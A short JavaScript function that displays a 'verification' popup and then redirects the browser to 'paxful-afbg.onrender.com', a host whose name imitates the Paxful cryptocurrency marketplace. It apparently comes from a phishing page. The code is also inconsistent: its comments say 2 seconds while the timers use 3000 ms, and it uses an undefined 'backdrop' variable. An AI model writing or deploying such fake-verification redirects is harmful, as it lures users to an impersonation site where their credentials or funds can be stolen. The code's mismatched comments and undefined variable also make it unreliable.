function verifyAndRedirect() {
    // Show the verification popup
    const popup = document.getElementById("verification-popup");
    popup.style.display = "block";
    
    // Redirect after 2 seconds (2000 milliseconds)
    setTimeout(function() {
        window.location.replace('https://paxful-afbg.onrender.com/');
    }, 3000);

    popup.style.display = "block";
    backdrop.style.display = "block";

    // Hide the popup after 2 seconds
    setTimeout(function() {
        popup.style.display = "none";
        backdrop.style.display = "none";
    }, 3000);

}